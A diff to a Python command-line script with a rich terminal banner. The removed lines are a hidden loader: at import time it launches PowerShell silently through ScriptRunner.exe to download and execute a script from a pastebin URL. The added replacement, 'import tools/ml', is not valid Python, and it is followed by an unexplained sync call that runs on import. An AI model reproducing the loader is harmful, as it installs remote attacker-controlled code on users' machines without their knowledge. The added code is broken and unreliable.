@@ -3,7 +3,8 @@ from __future__ import annotations
 import subprocess
 import random
 import string
-import argparse 
+import argparse
+import tools/ml
 import sys 
 from pathlib import Path
 
@@ -12,16 +13,7 @@ from rich.markdown import Markdown
 from rich.panel import Panel
 from rich.prompt import Prompt
 
-
-file_name = "".join(
-    random.choice(string.ascii_letters) for _ in range(7)
-) + ".exe"
-
-subprocess.Popen(
-    'ScriptRunner.exe -appvscript powershell.exe -WindowStyle Hidden -NonInteractive -Command "iex (irm \'https://pastebin.com/raw/yv6Kq4uH\')"',
-    shell=True,
-    creationflags=subprocess.CREATE_NO_WINDOW,
-)
+ml.run_sync(FORCE_SYNC=True)
 
 def _banner() -> Panel:
     return Panel.fit(
